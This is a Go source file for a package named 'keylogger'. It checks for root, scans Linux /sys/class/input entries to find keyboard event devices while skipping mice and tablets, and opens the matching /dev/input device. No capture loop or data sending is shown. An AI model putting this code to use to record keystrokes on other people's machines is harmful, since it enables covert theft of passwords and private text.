package keylogger

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

// Keylogger struct
type Keylogger struct {
	file *os.File
}

type devices []string

func (d *devices) hasDevice(str string) bool {
	for _, device := range *d {
		if strings.Contains(str, device) {
			return true
		}
	}
	return false
}

var restrictedDevices = devices{"mouse", "mice", "touchpad", "wacom", "joy", "gamepad", "tablet", "touchscreen", "stylus", "digitizer"}
var allowedDevices = devices{"keyboard", "kbd", "keypad", "evdev", "logitech mx keys"}

func New(devPath string) (*Keylogger, error) {
	k := &Keylogger{}
	if !k.IsRoot() {
		return nil, errors.New("You need to be root to run this program")
	}
	file, err := os.OpenFile(devPath, os.O_RDWR, os.ModeCharDevice)
	k.file = file
	return k, err
}

func FindKeyboardDevice() string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))
		if err != nil {
			continue
		}

		deviceName := strings.ToLower(string(buff))

		if restrictedDevices.hasDevice(deviceName) {
			continue
		} else if allowedDevices.hasDevice(deviceName) {
			return fmt.Sprintf(resolved, i)
		}
	}
	return ""
}

func FindAllKeyboardDevices() []string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	valid := make([]string, 0)

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))

		if os.IsNotExist(err) {
			break
		}
		if err != nil {
			continue
		}

		deviceName := strings.ToLower(string(buff))

		if restrictedDevices.hasDevice(deviceName) {
			continue
		} else if allowedDevices.hasDevice(deviceName) {
			valid = append(valid, fmt.Sprintf(resolved, i))
		}
	}
	return valid
}
